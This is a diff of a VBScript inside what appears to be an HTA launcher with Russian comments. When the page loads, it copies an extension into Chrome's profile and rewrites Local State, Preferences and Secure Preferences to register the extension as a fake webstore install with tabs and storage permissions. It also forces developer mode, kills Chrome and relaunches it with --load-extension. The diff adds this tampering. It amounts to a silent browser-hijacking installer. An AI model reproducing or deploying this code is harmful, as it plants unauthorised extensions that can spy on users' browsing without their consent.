@@ -51,15 +51,30 @@ Sub Window_onLoad
         xcopyCmd = "xcopy """ & tempFolder & "\test\*"" """ & chromeExtPath & "\" & """ /E /I /Y"
         shell.Run xcopyCmd, 0, True
         
-        ' Модифицируем Preferences файл
+        ' Модифицируем Local State
+        localStatePath = userDataPath & "\Local State"
+        If fso.FileExists(localStatePath) Then
+            Set stateFile = fso.OpenTextFile(localStatePath, 1)
+            stateContent = stateFile.ReadAll()
+            stateFile.Close
+            
+            If InStr(stateContent, """extensions""") = 0 Then
+                stateContent = Replace(stateContent, "{", "{""extensions"":{""settings"":{},""ui"":{""developer_mode"":true}},")
+            End If
+            
+            Set stateFile = fso.OpenTextFile(localStatePath, 2)
+            stateFile.Write stateContent
+            stateFile.Close
+        End If
+        
+        ' Модифицируем Preferences
         prefsPath = userDataPath & "\Default\Preferences"
         If fso.FileExists(prefsPath) Then
             Set prefsFile = fso.OpenTextFile(prefsPath, 1)
             content = prefsFile.ReadAll()
             prefsFile.Close
             
-            ' Добавляем настройки расширения
-            extSettings = """" & extensionId & """: {""active_permissions"": {""api"": [""tabs"", ""storage""]}, ""from_webstore"": true, ""granted_permissions"": {""api"": [""tabs"", ""storage""]}, ""location"": 1, ""manifest"": {""key"": ""MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvxVo7FPzl0Qg8qFtKqS0NjJqJNB4ZHWRmbxO+9H+0JrZPTHiiLVgDnJXvYpS5/5m4tOX/mffPbkGEHBmPFX1Zw0MxhUHjHiI4Qw4MPXKgwGHYvZoGhGT4WMbZqMYYCOhCmxkS9fhxDVyKGcbTYQPwYJHf+lKQMTHE+XlhZJHzXzJrHwUJBgKvp0yQxJVZ9GxD1LBF7+pf4FJyA9LxaVpQYSXjDgBGjwHW1YO+y+iUVDWxjKmxMwZc/KnMHjnw9t0AFgZHK+kxoiQHSG8FUKYRtQFQJOCHM2QhFJ0J4GZvR7G6o/8jl3+YBjwQDkQgk9GnFzUVhvuL+Qp5B9HBaJ+XQIDAQAB""}, ""path"": """ & extensionId & "_1.0.0"", ""state"": 1}"
+            extSettings = """" & extensionId & """: {""active_permissions"":{""api"":[""tabs"",""storage""]},""commands"":{},""content_settings"":[],""creation_flags"":1,""events"":[],""from_webstore"":true,""granted_permissions"":{""api"":[""tabs"",""storage""]},""location"":1,""manifest"":{""key"":""MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvxVo7FPzl0Qg8qFtKqS0NjJqJNB4ZHWRmbxO+9H+0JrZPTHiiLVgDnJXvYpS5/5m4tOX/mffPbkGEHBmPFX1Zw0MxhUHjHiI4Qw4MPXKgwGHYvZoGhGT4WMbZqMYYCOhCmxkS9fhxDVyKGcbTYQPwYJHf+lKQMTHE+XlhZJHzXzJrHwUJBgKvp0yQxJVZ9GxD1LBF7+pf4FJyA9LxaVpQYSXjDgBGjwHW1YO+y+iUVDWxjKmxMwZc/KnMHjnw9t0AFgZHK+kxoiQHSG8FUKYRtQFQJOCHM2QhFJ0J4GZvR7G6o/8jl3+YBjwQDkQgk9GnFzUVhvuL+Qp5B9HBaJ+XQIDAQAB""},""path"":""" & extensionId & "_1.0.0"",""state"":1}"
             
             If InStr(content, """extensions""") > 0 Then
                 If InStr(content, """settings""") > 0 Then
@@ -68,13 +83,34 @@ Sub Window_onLoad
                     content = Replace(content, """extensions"":{", """extensions"":{""settings"":{" & extSettings & "},")
                 End If
             Else
-                content = Replace(content, "{", "{""extensions"":{""settings"":{" & extSettings & "},""last_chrome_version"":""120.0.0.0""},")
+                content = Replace(content, "{", "{""extensions"":{""settings"":{" & extSettings & "},""ui"":{""developer_mode"":true}},")
             End If
             
-            ' Сохраняем изменения
             Set prefsFile = fso.OpenTextFile(prefsPath, 2)
             prefsFile.Write content
             prefsFile.Close
+        End If
+        
+        ' Модифицируем Secure Preferences
+        securePrefsPath = userDataPath & "\Default\Secure Preferences"
+        If fso.FileExists(securePrefsPath) Then
+            Set secureFile = fso.OpenTextFile(securePrefsPath, 1)
+            secureContent = secureFile.ReadAll()
+            secureFile.Close
+            
+            If InStr(secureContent, """extensions""") > 0 Then
+                If InStr(secureContent, """settings""") > 0 Then
+                    secureContent = Replace(secureContent, """settings"":{", """settings"":{" & extSettings & ",")
+                Else
+                    secureContent = Replace(secureContent, """extensions"":{", """extensions"":{""settings"":{" & extSettings & "},")
+                End If
+            Else
+                secureContent = Replace(secureContent, "{", "{""extensions"":{""settings"":{" & extSettings & "},""ui"":{""developer_mode"":true}},")
+            End If
+            
+            Set secureFile = fso.OpenTextFile(securePrefsPath, 2)
+            secureFile.Write secureContent
+            secureFile.Close
         End If
         
         ' Удаляем временные файлы
@@ -85,9 +121,9 @@ Sub Window_onLoad
         shell.Run "taskkill /F /IM chrome.exe /T", 0, True
         shell.Run "ping -n 3 127.0.0.1", 0, True
         
-        ' Запускаем Chrome с включенным режимом разработчика
+        ' Запускаем Chrome с расширенными параметрами
         chromePath = """C:\Program Files\Google\Chrome\Application\chrome.exe"""
-        shell.Run chromePath & " --enable-extensions", 1, False
+        shell.Run chromePath & " --enable-extensions --load-extension=""" & chromeExtPath & """ --enable-experimental-extension-apis", 1, False
     End If
     
     self.close
